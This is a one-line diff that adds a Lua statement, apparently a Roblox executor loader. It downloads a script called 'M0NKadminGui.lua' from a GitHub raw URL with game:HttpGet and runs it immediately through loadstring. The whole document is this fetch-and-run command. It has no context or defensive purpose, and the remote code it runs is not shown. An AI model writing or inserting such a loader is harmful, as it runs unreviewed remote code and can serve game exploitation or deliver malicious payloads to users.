@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MANASMCPE/M0nkAdminGui/refs/heads/main/M0NKadminGui.lua"))()
